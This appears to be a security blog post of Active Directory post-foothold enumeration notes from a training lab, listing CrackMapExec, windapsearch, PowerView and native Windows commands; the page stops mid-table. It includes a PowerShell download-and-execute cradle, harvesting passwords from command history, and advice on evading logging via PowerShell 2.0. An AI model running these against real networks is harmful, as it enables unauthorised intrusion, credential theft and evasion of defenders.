<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>AD CRED ENUM | Malw0re</title><meta name="author" content="Malw0re"><meta name="copyright" content="Malw0re"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Active Directory credential enumeration">
<meta property="og:type" content="article">
<meta property="og:title" content="AD CRED ENUM">
<meta property="og:url" content="https://malw0re.github.io/ouhboy/2023/08/09/ad-credential-enumeration/index.html">
<meta property="og:site_name" content="Malw0re">
<meta property="og:description" content="Active Directory credential enumeration">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://malw0re.github.io/ouhboy/images/darkbasin.jpg">
<meta property="article:published_time" content="2023-08-08T21:00:00.000Z">
<meta property="article:modified_time" content="2025-09-14T22:58:43.997Z">
<meta property="article:author" content="Malw0re">
<meta property="article:tag" content="Active-Directory">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://malw0re.github.io/ouhboy/images/darkbasin.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "AD CRED ENUM",
  "url": "https://malw0re.github.io/ouhboy/2023/08/09/ad-credential-enumeration/",
  "image": "https://malw0re.github.io/ouhboy/images/darkbasin.jpg",
  "datePublished": "2023-08-08T21:00:00.000Z",
  "dateModified": "2025-09-14T22:58:43.997Z",
  "author": [
    {
      "@type": "Person",
      "name": "Malw0re",
      "url": "https://malw0re.github.io/ouhboy"
    }
  ]
}</script><link rel="shortcut icon" href="/ouhboy/img/favicon.png"><link rel="canonical" href="https://malw0re.github.io/ouhboy/2023/08/09/ad-credential-enumeration/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/ouhboy/css/index.css?v=5.5.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.0.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/ouhboy/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'AD CRED ENUM',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      if ($loadingBox.classList.contains('loaded')) return
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()

  if (document.readyState === 'complete') {
    preloader.endLoading()
  } else {
    window.addEventListener('load', preloader.endLoading)
    document.addEventListener('DOMContentLoaded', preloader.endLoading)
    // Add timeout protection: force end after 7 seconds
    setTimeout(preloader.endLoading, 7000)
  }

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/ouhboy/images/cyber.png" onerror="this.onerror=null;this.src='/ouhboy/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/ouhboy/archives/"><div class="headline">Articles</div><div class="length-num">10</div></a><a href="/ouhboy/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/ouhboy/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/ouhboy/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/ouhboy/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/ouhboy/categories/writeups/"><i class="fa-fw fas fa-folder-open"></i><span> Writeups</span></a></div><div class="menus_item"><a class="site-page" href="/ouhboy/categories/research/"><i class="fa-fw fas fa-folder-open"></i><span> Research</span></a></div><div class="menus_item"><a class="site-page" href="/ouhboy/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/ouhboy/images/cyberpunk-red.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/ouhboy/"><span class="site-name">Malw0re</span></a><a class="nav-page-title" href="/ouhboy/"><span class="site-name">AD CRED ENUM</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/ouhboy/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/ouhboy/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/ouhboy/categories/writeups/"><i class="fa-fw fas fa-folder-open"></i><span> Writeups</span></a></div><div class="menus_item"><a class="site-page" href="/ouhboy/categories/research/"><i class="fa-fw fas fa-folder-open"></i><span> Research</span></a></div><div class="menus_item"><a class="site-page" href="/ouhboy/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">AD CRED ENUM</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-08-08T21:00:00.000Z" title="Created 2023-08-09 00:00:00">2023-08-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-09-14T22:58:43.997Z" title="Updated 2025-09-15 01:58:43">2025-09-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/ouhboy/categories/research/">research</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><img src="https://miro.medium.com/v2/resize:fit:750/0*Kz1iA9w7Ciywdu1A.jpg"></p>
<h2 id="Credential-Enumeration"><a href="#Credential-Enumeration" class="headerlink" title="Credential Enumeration"></a>Credential Enumeration</h2><p>After acquiring a foothold, you must dig deeper using the low-privilege domain user credentials. Information to be interested in when enumerating:</p>
<ul>
<li>Domain users</li>
<li>Computer Attributes</li>
<li>group membership</li>
<li>Group Policy Objects</li>
<li>Permissions</li>
<li>ACLs</li>
<li>Trusts</li>
</ul>
<p>but not limited to the above, but the most <strong>important thing to remember is that most of these tools will not work without domain users’ credentials at any permission level.</strong></p>
<p>So at a minimum, you need to have acquired a user’s cleartext password, NTLM password hash or SYSTEM access on a domain-joined host.</p>
<h2 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec."></a>CrackMapExec.</h2><p>This tool can be used to assess AD environments, where it utilizes packages from the impacket and powersploit toolkit to perform its functions.</p>
<h3 id="Domain-UserEnum"><a href="#Domain-UserEnum" class="headerlink" title="Domain UserEnum"></a>Domain UserEnum</h3><p>When enumerating you need to point CME to the Domain Controller, using creds that you retrieved you can list out domain users, it is noted that CME provides a <strong><strong><strong><strong><strong>badPwdCount</strong></strong></strong></strong></strong> attribute which is helpful when performing targeted pass spraying or building a target users list filtered out with user badPwdCount attribute that’s above 0 to be careful not to lock out accounts.</p>
<p><code>sudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx --users</code></p>
<h3 id="Domain-Group-Enum"><a href="#Domain-Group-Enum" class="headerlink" title="Domain Group Enum"></a>Domain Group Enum</h3><p>We can also obtain a complete listing of domain groups. We should save all of our output to files to easily access it again later for reporting or use with other tools.</p>
<p><code>sudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx</code>  <code>--groups</code> </p>
<p>We can begin to note down groups of interest. Take note of key groups like <code>Administrators</code>, <code>Domain Admins</code>, <code>Executives</code>, any groups that may contain privileged IT admins, etc. These groups likely contain users with elevated privileges worth targeting during our assessment.</p>
<h2 id="Smbmap"><a href="#Smbmap" class="headerlink" title="Smbmap"></a>Smbmap</h2><p>A tool for enumerating SMB shares from a Linux environment can be used to list shares, permissions and share content. </p>
<h3 id="recursive-list-Dirs-in-Shares"><a href="#recursive-list-Dirs-in-Shares" class="headerlink" title="recursive list Dirs in Shares"></a>recursive list Dirs in Shares</h3><p><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R &#39;Department Shares&#39; --dir-only</code></p>
<h2 id="RpcClient"><a href="#RpcClient" class="headerlink" title="RpcClient"></a>RpcClient</h2><p>Used to enumerate, add, change and even remove objects from AD.</p>
<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers">Relative Identifier (RID)</a> is a unique identifier utilized to track and identify objects, for example:</p>
<ul>
<li><p>The <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers">SID</a> for the INLANEFREIGHT.LOCAL domain is: <code>S-1-5-21-3842939050-3880317879-2865463114</code>.</p>
</li>
<li><p>When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.</p>
</li>
<li><p>So the domain user <code>htb-student</code> with a RID:[0x457] Hex 0x457 would &#x3D; decimal <code>1111</code>, will have a full user SID of <code>S-1-5-21-3842939050-3880317879-2865463114-1111</code>.</p>
</li>
<li><p>This is unique to the <code>htb-student</code> object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.</p>
</li>
</ul>
<p>Some accounts will have the same RID regardless of what host you are on, built-in admin accounts for domains will have <strong>500</strong> or <strong>0x1f4</strong> this value is unique to an object hence we can use it to enumerate further info from the domain.</p>
<h2 id="Impacket-Toolkit"><a href="#Impacket-Toolkit" class="headerlink" title="Impacket-Toolkit"></a>Impacket-Toolkit</h2><p>impacket is a versatile toolkit which gives different ways to enumerate, interact and exploit Windows protocols and find the information needed using Python. </p>
<h3 id="Psexec-py"><a href="#Psexec-py" class="headerlink" title="Psexec.py"></a>Psexec.py</h3><p>A clone of sysinternals psexec executable works by creating a remote service by uploading a randomly-named executable to the ADMIN$ shares on the target host and registers the service via RPC and the Windows services control manager.</p>
<p>Once comms are established it provides a shell as a SYSTEM on the victim host.</p>
<h3 id="windapsearch"><a href="#windapsearch" class="headerlink" title="windapsearch"></a>windapsearch</h3><p><a target="_blank" rel="noopener" href="https://github.com/ropnop/windapsearch">Windapsearch</a> is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries, we can also perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The <code>--da</code>(enumerate domain admins group members ) option and the <code>-PU</code>( find privileged users) options. The <code>-PU</code> option is interesting because it will perform a recursive search for users with nested group membership.</p>
<h3 id="Domain-Admins"><a href="#Domain-Admins" class="headerlink" title="Domain-Admins"></a>Domain-Admins</h3><p><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da</code></p>
<p>This enumerates Domain Admin Groups.</p>
<h3 id="Privileged-Users"><a href="#Privileged-Users" class="headerlink" title="Privileged Users"></a>Privileged Users</h3><p>Checking for potential users, using <strong>-PU</strong> with elevated privileges that may have gone unnoticed.</p>
<p><strong>N&#x2F;B This is a great check for reporting since it will most likely inform the customer of users with excess privileges from nested group membership.</strong></p>
<p><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU</code></p>
<h2 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h2><p>Once you have the domain credentials, you can run <a target="_blank" rel="noopener" href="https://github.com/fox-it/BloodHound.py">BloodHound.py</a> a tool for auditing Active Directory where it takes large amounts of data that would be time-consuming to sift through and create a GUI representation or “attack paths” of where access with a particular user may lead.</p>
<ul>
<li><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3></li>
</ul>
<p>At this point, we are interested in other misconfiguration and permission issues that could lead to lateral and vertical movement, getting the bigger picture of how the domain is setup</p>
<ul>
<li>Do any trusts exist with other domains both inside &amp; outside the current forest?</li>
<li>Files shares that our user has access to.</li>
</ul>
<h2 id="ActiveDirectory-Powershell-Modules"><a href="#ActiveDirectory-Powershell-Modules" class="headerlink" title="ActiveDirectory Powershell Modules"></a>ActiveDirectory Powershell Modules</h2><p>These are groups of Powershell cmdlets for enumerating AD environments.</p>
<p><code>Get-ADDomain</code> - Print out domain SID, domain functional level, and child domains.</p>
<p><code>Get-ADUser -Filter &#123;ServicePrincipalName -ne &quot;$null&quot;&#125; -Properties ServicePrincipalName</code> This will filter ACC with the <strong>serviceprincipalname</strong> property populated and also get us a listing ACC that may be susceptible to kerberos attacks.</p>
<p><code>Get-ADTrust -Filter *</code> - prints out any trust relationship the domain has, it’s useful when looking at how to take advantage of the child-to-parent trust relationship and attack across forest trusts.</p>
<p><code>Get-ADGroup -Filter * | select name</code> - Group enumeration</p>
<p><code>Get-ADGroup -Identity &quot;Backup Operators&quot;</code> - Detailed Group Info</p>
<p><code>Get-ADGroupMember -Identity &quot;Backup Operators&quot;</code> - Getting Group Membership</p>
<h2 id="Powerview"><a href="#Powerview" class="headerlink" title="Powerview"></a>Powerview</h2><p>It identifies where users are logged in on a network, enumerates domain info such as users, computers, groups, ACLs, and trusts, hunts for file shares and passwords, performs Kerberoasting and more.</p>
<p>It gives an insight into the security posture of the target domain. </p>
<ul>
<li><h3 id="commands"><a href="#commands" class="headerlink" title="commands"></a>commands</h3></li>
</ul>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>Export-PowerViewCSV</td>
<td>Append results to a CSV file</td>
</tr>
<tr>
<td>ConvertTo-SID</td>
<td>Convert a User or group name to its SID value</td>
</tr>
<tr>
<td>Get-DomainSPNTicket</td>
<td>Requests the Kerberos ticket for a specified Service Principal Name (SPN) account</td>
</tr>
<tr>
<td><strong>Domain&#x2F;LDAP Functions</strong></td>
<td></td>
</tr>
<tr>
<td>Get-Domain</td>
<td>Will return the AD object for the current (or specified) domain</td>
</tr>
<tr>
<td>Get-DomainController</td>
<td>Return a list of the Domain Controllers for the specified domain</td>
</tr>
<tr>
<td>Get-DomainUser</td>
<td>Will return all users or specific user objects in AD</td>
</tr>
<tr>
<td>Get-DomainComputer</td>
<td>Will return all computers or specific computer objects in AD</td>
</tr>
<tr>
<td>Get-DomainGroup</td>
<td>Will return all groups or specific group objects in AD</td>
</tr>
<tr>
<td>Get-DomainOU</td>
<td>Search for all or specific OU objects in AD</td>
</tr>
<tr>
<td>Find-InterestingDomainAcl</td>
<td>Finds object ACLs in the domain with modification rights set to non-built in objects</td>
</tr>
<tr>
<td>Get-DomainGroupMember</td>
<td>Will return the members of a specific domain group</td>
</tr>
<tr>
<td>Get-DomainFileServer</td>
<td>Returns a list of servers likely functioning as file servers</td>
</tr>
<tr>
<td>Get-DomainDFSShare</td>
<td>Returns a list of all distributed file systems for the current (or specified) domain</td>
</tr>
<tr>
<td>GPO Functions:</td>
<td></td>
</tr>
<tr>
<td>Get-DomainGPO</td>
<td>Will return all GPOs or specific GPO objects in AD</td>
</tr>
<tr>
<td>Get-DomainPolicy</td>
<td>Returns the default domain policy or the domain controller policy for the current domain</td>
</tr>
<tr>
<td><strong>Computer Enumeration Functions</strong>:</td>
<td></td>
</tr>
<tr>
<td>Get-NetLocalGroup</td>
<td>Enumerates local groups on the local or a remote machine</td>
</tr>
<tr>
<td>Get-NetLocalGroupMember</td>
<td>Enumerates members of a specific local group</td>
</tr>
<tr>
<td>Get-NetShare</td>
<td>Returns open shares on the local (or a remote) machine</td>
</tr>
<tr>
<td>Get-NetSession</td>
<td>Will return session information for the local (or a remote) machine</td>
</tr>
<tr>
<td>Test-AdminAccess</td>
<td>Tests if the current user has administrative access to the local (or a remote) machine</td>
</tr>
<tr>
<td><strong>Threaded ‘Meta’-Functions</strong></td>
<td></td>
</tr>
<tr>
<td>Find-DomainUserLocation</td>
<td>Finds machines where specific users are logged in</td>
</tr>
<tr>
<td>Find-DomainShare</td>
<td>Finds reachable shares on domain machines</td>
</tr>
<tr>
<td>Find-InterestingDomainShareFile</td>
<td>Searches for files matching specific criteria on readable shares in the domain</td>
</tr>
<tr>
<td>Find-LocalAdminAccess</td>
<td>Find machines on the local domain where the current user has local administrator access</td>
</tr>
<tr>
<td><strong>Domain Trust Functions</strong></td>
<td></td>
</tr>
<tr>
<td>Get-DomainTrust</td>
<td>Returns domain trusts for the current domain or a specified domain</td>
</tr>
<tr>
<td>Get-ForestTrust</td>
<td>Returns all forest trusts for the current forest or a specified forest</td>
</tr>
<tr>
<td>Get-DomainForeignUser</td>
<td>Enumerates users who are in groups outside of the user’s domain</td>
</tr>
<tr>
<td>Get-DomainForeignGroupMember</td>
<td>Enumerates groups with users outside of the group’s domain and returns each foreign member</td>
</tr>
<tr>
<td>Get-DomainTrustMapping</td>
<td>Will enumerate all trusts for the current domain and any others seen.</td>
</tr>
</tbody></table>
<p><strong>Domain User Info</strong>        </p>
<p><code>Get-DomainUser -Identity morgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname, description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol</code></p>
<p><strong><strong><strong>Recursive Group Membership</strong></strong></strong></p>
<p><code>Get-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse</code> - retrieve group-specific information and recurse which means if it finds any groups that are part of the target group (<strong><strong><strong>nested group membership</strong></strong></strong>) to list out the members of those groups.</p>
<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Trust Enumeration.</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p><code>Get-DomainTrustMapping</code> test for local admin access on either the current machine or the remote one.</p>
<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Testing for Local Admin Access</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p><code>Test-AdminAccess -ComputerName ACADEMY-EA-MS01</code></p>
<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Users with SPN Set</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p><code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code></p>
<h2 id="Shares"><a href="#Shares" class="headerlink" title="Shares"></a>Shares</h2><p>Allows users on the domain to quickly access info relevant to their daily roles and share content with their organization. </p>
<h3 id="Snaffler"><a href="#Snaffler" class="headerlink" title="Snaffler"></a>Snaffler</h3><p> A tool that helps in acquiring credentials or other sensitive data in AD, works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories.</p>
<h2 id="Living-off-the-Land"><a href="#Living-off-the-Land" class="headerlink" title="Living off the Land"></a>Living off the Land</h2><p>Discussion on Techniques for utilizing native Windows tools to perform our enumeration is considered a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network.</p>
<p>Most enterprise environments have network monitoring and logging, including IDS&#x2F;IPS, firewalls and passive sensors and tools on top of their host-based defences Windows Defender or enterprise EDR.</p>
<h3 id="Env-Enumeration-Host-Network-Recon"><a href="#Env-Enumeration-Host-Network-Recon" class="headerlink" title="Env Enumeration Host &amp; Network Recon"></a>Env Enumeration Host &amp; Network Recon</h3><table>
<thead>
<tr>
<th>Command</th>
<th>Result</th>
</tr>
</thead>
<tbody><tr>
<td>hostname</td>
<td>Prints the PC’s Name</td>
</tr>
<tr>
<td>[System.Environment]::OSVersion.Version</td>
<td>Prints out the OS version and revision level</td>
</tr>
<tr>
<td>wmic qfe get Caption,Description,HotFixID,InstalledOn</td>
<td>Prints the patches and hotfixes applied to the host</td>
</tr>
<tr>
<td>ipconfig &#x2F;all</td>
<td>Prints out network adapter state and configurations</td>
</tr>
<tr>
<td>set %USERDOMAIN%</td>
<td>Displays the domain name to which the host belongs (ran from CMD-prompt)</td>
</tr>
<tr>
<td>set %logonserver%</td>
<td>Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)</td>
</tr>
</tbody></table>
<h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h2><p>It provides an extensive framework for administering all facets of Windows systems and AD Environments, can be used to dig deep into systems and can be used on engagements to recon the host and network and send and receive files.</p>
<table>
<thead>
<tr>
<th>Cmd-Let</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>Get-Module</td>
<td>Lists available modules loaded for use.</td>
</tr>
<tr>
<td>Get-ExecutionPolicy -List</td>
<td>Will print the <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2</a> settings for each scope on a host.</td>
</tr>
<tr>
<td>Set-ExecutionPolicy Bypass -Scope Process</td>
<td>This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won’t be making a permanent change to the victim host.</td>
</tr>
<tr>
<td>Get-Content C:\Users&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt</td>
<td>With this string, we can get the specified user’s PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.</td>
</tr>
<tr>
<td>Get-ChildItem Env:</td>
<td>ft Key, Value</td>
</tr>
<tr>
<td>powershell -nop -c “iex(New-Object Net.WebClient).DownloadString(‘URL to download the file from’); <follow-on commands>“</td>
<td>This is a quick and easy way to download a file from the web using PowerShell and call it from memory.</td>
</tr>
</tbody></table>
<h2 id="OPSec-Tactics"><a href="#OPSec-Tactics" class="headerlink" title="OPSec Tactics"></a>OPSec Tactics</h2><p>A few Operational security tactics that defenders are unaware of are that several versions of Powershell often exist on a host. If not uninstalled, they can still be used.</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><blockquote>
<p>Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders’ radar while utilizing resources built into the hosts to our advantage.</p>
</blockquote>
<h3 id="Checking-Defenses"><a href="#Checking-Defenses" class="headerlink" title="Checking Defenses."></a>Checking Defenses.</h3><p>These few commands will utilize the <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts">netsh</a> and <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query">sc</a> to help get an understanding of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.</p>
<p>Firewall check - <code>netsh advfirewall show allprofiles</code></p>
<p>Defender check cmd - <code>sc query windefend</code></p>
<p>Checking the status and configuration settings - <code>Get-MpComputerStatus</code></p>
<h2 id="Am-I-Alone"><a href="#Am-I-Alone" class="headerlink" title="Am I Alone?"></a>Am I Alone?</h2><p>When landing on a host for the first time, it’s important to check and see if you are the only one logged in since if you take certain actions from a host someone else is logged on, there is potential for them to identify you.</p>
<p>If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.</p>
<h3 id="Network-Enumeration"><a href="#Network-Enumeration" class="headerlink" title="Network Enumeration"></a>Network Enumeration</h3><table>
<thead>
<tr>
<th>Networking Commands</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>arp -a</td>
<td>Lists all known hosts stored in the arp table.</td>
</tr>
<tr>
<td>ipconfig &#x2F;all</td>
<td>Prints out adapter settings for the host. We can figure out the network segment from here.</td>
</tr>
<tr>
<td>route print</td>
<td>Displays the routing table (IPv4 &amp; IPv6) identifying known networks and layer three routes shared with the host.</td>
</tr>
<tr>
<td>netsh advfirewall shows state</td>
<td>Displays the status of the host’s firewall. We can determine if it is active and filtering traffic.</td>
</tr>
</tbody></table>
<h3 id="Windows-Management-Instrumentation-WMI"><a href="#Windows-Management-Instrumentation-WMI" class="headerlink" title="Windows Management Instrumentation (WMI)"></a>Windows Management Instrumentation (WMI)</h3><p> This scripting engine is used within Windows enterprises to retrieve info and run admin tasks on local and remote hosts.</p>
<p><strong>Quick WMI checks</strong></p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>wmic qfe get Caption,Description,HotFixID,InstalledOn</td>
<td>Prints the patch level and description of the Hotfixes applied</td>
</tr>
<tr>
<td>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles &#x2F;format:List</td>
<td>Displays basic host information to include any attributes within the list</td>
</tr>
<tr>
<td>wmic process list &#x2F;format:list</td>
<td>A listing of all processes on host</td>
</tr>
<tr>
<td>wmic ntdomain list &#x2F;format:list</td>
<td>Displays information about the Domain and Domain Controllers</td>
</tr>
<tr>
<td>wmic useraccount list &#x2F;format:list</td>
<td>Displays information about all local accounts and any domain accounts that have logged into the device</td>
</tr>
<tr>
<td>wmic group list &#x2F;format:list</td>
